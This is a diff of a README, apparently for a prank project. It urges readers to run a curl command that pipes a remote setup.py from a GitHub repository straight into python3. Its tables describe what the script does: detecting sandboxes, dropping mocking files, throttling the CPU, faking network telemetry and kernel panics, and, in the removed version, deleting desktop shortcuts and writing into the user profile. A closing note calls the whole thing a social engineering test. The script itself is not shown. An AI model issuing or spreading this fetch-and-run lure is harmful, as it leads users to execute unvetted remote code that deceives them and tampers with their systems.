@@ -377,18 +377,20 @@ For the Linux gatekeepers and macOS purists who think using a terminal makes the
 curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
 ```
 
-If you are Paranoid/Isolated and you suffer from trust issues or are too lazy to open files and prefer to audit the payloads locally before executing your configuration realignment, evaluate your terminal environment as much as you wish.
+If you are Paranoid/Isolated and you suffer from trust issues, pride yourself on reading payloads locally, and refuse to pipe raw URLs directly into your terminal, we have anticipated your exact behavioural vector. Evaluate your sandboxed isolation container as much as you wish. You have got the freedom to, so use it wisely. 
+
 ---
 
-*Note: If any of these diagnostic indicators throw an unexpected system error, it only mathematically validates the evaluation.*
+*Note: If any of these diagnostic indicators throw a simulated kernel panic or trigger frantic escape attempts, it only mathematically validates the evaluation.*
 
-#### 🛡️ Payload Blueprint: What does `setup.py` actually execute?
+#### 🛡️ Paranoid Blueprint v2: The Containment Simulator
 
 | Verification Stage | Routine Target | Internal Method | Expected System State |
 | :--- | :--- | :--- | :--- |
-| **Stage 01: Audit** | GUI Dependency Scan | `sys.platform` check | If mouse coordinates > keyboard inputs, log `SKILL_ISSUE` |
-| **Stage 02: Purge** | Bloatware Clearance | `os.system()` trigger | Removes point-and-click adventure shortcuts from your desktop |
-| **Stage 03: Injection**| Mainframe Alignment | Environment variable export | Forces permanent terminal-only reality check into user profile |
+| **Stage 01: Host Decoupling** | Hypervisor & Sandbox Scan | `sys.executable` & `os.environ` check | Identifies Replit/Docker; drops `CONFIRMED_COWARD.txt` and throttles virtual CPU to 1% to simulate a resource freeze. |
+| **Stage 02: Network Intercept** | Local Trust Network Spoofing | Background multi-hop proxy routing loop | Simulates real-time outbound connection telemetry mapping `[127.0.0.1 -> 10.0.0.1 -> PROXIED]` to trigger a panic response. |
+| **Stage 03: Authority Decouple** | Honeypot Loop Trapping | Artificial lag spikes + raw address memory dumps | Flash-scrolls a matrix of fake hexadecimal keys labeled `[UNLINK_AUTH_KEY]` to convince you your local encryption is breaking. |
+| **Stage 04: Paradox Compliance** | Defiance Overlap Vector | Frantic `Ctrl+C` interrupt handling | Tracking spam counts; over 4 interrupt signals overrides terminal formatting to output blinking `[FATAL] KERNEL PANIC` messages. |
 
 > [!IMPORTANT]
 > Downloading and running unverified scripts straight from a 13-year-old's repository because a text block told you it would "audit your system" mathematically confirms that your local cybersecurity framework is operating at a severe deficit. Congratulations on passing the social engineering gateway.
